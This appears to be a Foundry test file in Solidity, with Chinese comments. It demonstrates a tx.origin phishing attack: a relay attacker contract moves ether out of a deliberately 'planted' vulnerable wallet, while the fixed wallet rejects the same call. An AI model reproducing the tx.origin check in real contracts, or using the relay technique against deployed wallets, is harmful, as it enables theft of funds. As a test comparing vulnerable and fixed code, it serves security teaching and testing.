// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Wallet} from "../src/Wallet.sol";
import {WalletPlanted} from "../src/planted/WalletPlanted.sol";

interface IWallet {
    function transferTo(address payable to, uint256 amount) external;
}

/// @dev 攻击者合约：owner EOA 通过它中转调用，tx.origin 仍是 owner。
contract WalletAttacker {
    function attack(IWallet w, address payable to) external {
        w.transferTo(to, 1 ether);
    }
}

contract WalletTxOriginPoC is Test {
    address owner = address(0x1111);

    function setUp() public {
        vm.deal(owner, 10 ether);
    }

    /// @notice 健康版：msg.sender 是攻击者合约，被拒。
    function test_TxOrigin_Healthy_BlocksContract() public {
        vm.startPrank(owner, owner);
        Wallet w = new Wallet{value: 5 ether}();
        WalletAttacker a = new WalletAttacker();
        vm.expectRevert(bytes("not owner"));
        a.attack(IWallet(address(w)), payable(owner));
        vm.stopPrank();
    }

    /// @notice 埋雷版：tx.origin == owner，中转调用被放行，资金被转走。
    function test_TxOrigin_Planted_AttackSucceeds() public {
        vm.startPrank(owner, owner);
        WalletPlanted w = new WalletPlanted{value: 5 ether}();
        WalletAttacker a = new WalletAttacker();
        uint256 before = owner.balance;
        a.attack(IWallet(address(w)), payable(owner));
        assertEq(owner.balance, before + 1 ether, "owner should receive 1 ether");
        vm.stopPrank();
    }
}
